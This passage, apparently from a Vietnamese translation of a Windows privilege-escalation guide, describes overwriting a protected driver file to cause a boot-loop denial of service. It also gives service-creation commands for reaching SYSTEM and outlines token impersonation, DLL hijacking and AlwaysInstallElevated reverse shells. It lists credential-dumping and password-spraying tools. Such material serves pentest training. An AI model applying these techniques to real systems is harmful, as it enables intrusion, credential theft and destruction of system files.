3. Chờ component có đặc quyền ghi log (ví dụ: admin kích hoạt “gửi SMS thử nghiệm”). Lúc này, dữ liệu được ghi vào `C:\Windows\System32\cng.sys`.
4. Kiểm tra mục tiêu đã bị ghi đè (bằng trình phân tích hex/PE) để xác nhận dữ liệu bị hỏng; khởi động lại sẽ buộc Windows tải driver đã bị can thiệp → **boot loop DoS**. Cách này cũng áp dụng cho mọi file được bảo vệ mà một dịch vụ có đặc quyền sẽ mở để ghi.

> `cng.sys` thường được tải từ `C:\Windows\System32\drivers\cng.sys`, nhưng nếu có bản sao tại `C:\Windows\System32\cng.sys`, Windows có thể thử tải bản này trước, khiến nó trở thành một đích DoS đáng tin cậy để ghi dữ liệu bị hỏng.



## **Từ High Integrity lên System**

### **Dịch vụ mới**

Nếu bạn đã chạy trong một process High Integrity, **đường lên SYSTEM** có thể dễ dàng đạt được chỉ bằng cách **tạo và thực thi một dịch vụ mới**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Khi tạo service binary, hãy đảm bảo đó là một service hợp lệ hoặc binary thực hiện nhanh các hành động cần thiết, vì nó sẽ bị dừng sau 20 giây nếu không phải là service hợp lệ.

### AlwaysInstallElevated

Từ một tiến trình High Integrity, bạn có thể thử **bật các registry entry AlwaysInstallElevated** và **cài đặt** reverse shell bằng một trình bao bọc _**.msi**_.\
[Xem thêm thông tin về các registry key liên quan và cách cài đặt gói _.msi_ tại đây.](#alwaysinstallelevated)

### High + SeImpersonate privilege lên System

**Bạn có thể** [**tìm code tại đây**](seimpersonate-from-high-to-system.md)**.**

### Từ SeDebug + SeImpersonate đến Full Token privileges

Nếu có các token privilege đó (có lẽ bạn sẽ thấy chúng trong một tiến trình High Integrity), bạn có thể **mở gần như bất kỳ tiến trình nào** (ngoại trừ các tiến trình được bảo vệ) bằng SeDebug privilege, **sao chép token** của tiến trình đó và tạo **một tiến trình tùy ý với token đó**.\
Kỹ thuật này thường được dùng để **chọn bất kỳ tiến trình nào chạy dưới quyền SYSTEM với đầy đủ token privilege** (_đúng vậy, bạn có thể tìm thấy các tiến trình SYSTEM không có đầy đủ token privilege_).\
**Bạn có thể tìm thấy** [**ví dụ về code thực thi kỹ thuật được đề xuất tại đây**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Kỹ thuật này được meterpreter dùng để leo thang đặc quyền trong `getsystem`. Kỹ thuật này bao gồm **tạo một pipe rồi tạo/lạm dụng một service để ghi vào pipe đó**. Sau đó, **server** đã tạo pipe bằng privilege **`SeImpersonate`** có thể **mạo danh token** của client pipe (service) để có được đặc quyền SYSTEM.\
Nếu muốn [**tìm hiểu thêm về named pipes, hãy đọc nội dung này**](#named-pipe-client-impersonation).\
Nếu muốn xem ví dụ về [**cách chuyển từ High Integrity lên System bằng named pipes, hãy đọc nội dung này**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Nếu bạn có thể **hijack một dll** được một **tiến trình** chạy dưới quyền **SYSTEM** **nạp**, bạn sẽ có thể thực thi code tùy ý với các quyền đó. Vì vậy, Dll Hijacking cũng hữu ích cho kiểu leo thang đặc quyền này. Hơn nữa, việc này **dễ thực hiện hơn nhiều từ một tiến trình High Integrity**, vì tiến trình đó có **quyền ghi** vào các thư mục được dùng để nạp dll.\
**Bạn có thể** [**tìm hiểu thêm về Dll hijacking tại đây**](dll-hijacking/index.html)**.**

### **Từ Administrator hoặc Network Service lên System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Từ LOCAL SERVICE hoặc NETWORK SERVICE lên đầy đủ privilege

**Đọc:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Tài liệu trợ giúp thêm

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Công cụ hữu ích

**Công cụ tốt nhất để tìm các vector leo thang đặc quyền cục bộ trên Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kiểm tra lỗi cấu hình và các file nhạy cảm (**[**xem tại đây**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Đã bị phát hiện.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kiểm tra một số lỗi cấu hình có thể có và thu thập thông tin (**[**xem tại đây**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kiểm tra lỗi cấu hình**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Trích xuất thông tin phiên đã lưu của PuTTY, WinSCP, SuperPuTTY, FileZilla và RDP. Dùng -Thorough trên máy cục bộ.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Trích xuất thông tin xác thực từ Credential Manager. Đã bị phát hiện.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Thử các mật khẩu đã thu thập được trên domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh là công cụ giả mạo PowerShell ADIDNS/LLMNR/mDNS và man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Công cụ liệt kê Windows cơ bản để leo thang đặc quyền**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Tìm các lỗ hổng leo thang đặc quyền đã biết (ĐÃ LỖI THỜI, thay bằng Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Kiểm tra cục bộ **(Cần quyền Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tìm các lỗ hổng leo thang đặc quyền đã biết (cần biên dịch bằng VisualStudio) ([**bản biên dịch sẵn**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Liệt kê host để tìm lỗi cấu hình (thiên về công cụ thu thập thông tin hơn là leo thang đặc quyền) (cần biên dịch) **(**[**bản biên dịch sẵn**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Trích xuất thông tin xác thực từ nhiều phần mềm (có exe biên dịch sẵn trên github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Bản chuyển thể PowerUp sang C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Kiểm tra lỗi cấu hình (có executable biên dịch sẵn trên github). Không khuyến nghị. Không hoạt động tốt trên Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kiểm tra các lỗi cấu hình có thể có (exe từ python). Không khuyến nghị. Không hoạt động tốt trên Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Công cụ được tạo dựa trên bài viết này (không cần accesschk để hoạt động bình thường nhưng có thể dùng nó).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Đọc đầu ra của **systeminfo** và đề xuất các exploit đang hoạt động (python chạy cục bộ)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Đọc đầu ra của **systeminfo** và đề xuất các exploit đang hoạt động (Python chạy cục bộ)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Bạn cần biên dịch project bằng phiên bản .NET phù hợp ([xem tại đây](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Để xem phiên bản .NET đã cài đặt trên host nạn nhân, bạn có thể chạy:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Kiến thức nền tảng về leo thang đặc quyền trên Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Leo thang đặc quyền bằng cách khai thác quyền thư mục yếu](http://www.greyhathacker.net/?p=738)
- [3] [Leo thang đặc quyền trên Windows - bảng ghi nhớ](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Workshop leo thang đặc quyền cục bộ trên Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Tấn công Windows: AT là xu hướng mới (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Leo thang đặc quyền - Windows - Hướng dẫn OSCP toàn diện](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Leo thang đặc quyền - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Hướng dẫn leo thang đặc quyền trên Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Danh sách kiểm tra leo thang đặc quyền trên Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Leo thang đặc quyền trên Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Các phương pháp leo thang đặc quyền trên Windows dành cho pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Lừa đảo qua email bằng macro Word VBA qua SMTP → giải mã thông tin xác thực hMailServer → khai thác Veeam CVE-2023-27532 để đạt quyền SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Rò rỉ format string + stack BOF → VirtualAlloc ROP (RCE) và đánh cắp kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Truy đuổi Silver Fox: Mèo vờn chuột trong bóng tối kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Lỗ hổng hệ thống tệp có đặc quyền trong một hệ thống SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Công cụ kiểm thử symbolic link – cách sử dụng CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Trở về quá khứ. Lạm dụng symbolic link trên Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [Tạm biệt RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (bản port Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Phân giải module nguy hiểm trên Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: tải từ các thư mục `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Các thử thách trong danh sách kiểm tra C/C++, đã có lời giải](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Hàm RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Chiếm quyền các binary dịch vụ](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own với Microslop: Kết hợp CLDFLT và các điều kiện tranh chấp kernel DirectX để leo thang đặc quyền cục bộ trên Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Một I/O Ring thống trị tất cả: Primitive khai thác đọc/ghi toàn diện trên Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Lạm dụng thao tác xóa tệp tùy ý để leo thang đặc quyền và nhiều thủ thuật hữu ích khác](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - mã khai thác FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Tấn công WSUS Phần 2: CVE-2020-1013, lỗ hổng leo thang đặc quyền cục bộ trên Windows 10 được khai thác trong vòng một ngày](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Khám phá Credential Manager và Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Khi thay đổi image dẫn đến leo thang đặc quyền](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Trích xuất SSH private key từ SSH agent trên Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Biến máy chủ cập nhật doanh nghiệp thành các nhà máy cửa hậu (0_o) – Phần 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Biến máy chủ cập nhật doanh nghiệp thành các nhà máy cửa hậu (0_o) – Phần 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Leo thang đặc quyền bằng cách xóa thư mục Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Lần theo dấu vết để trở lại NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Thông báo tư vấn về leo thang đặc quyền qua offset bộ nhớ dùng chung của Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
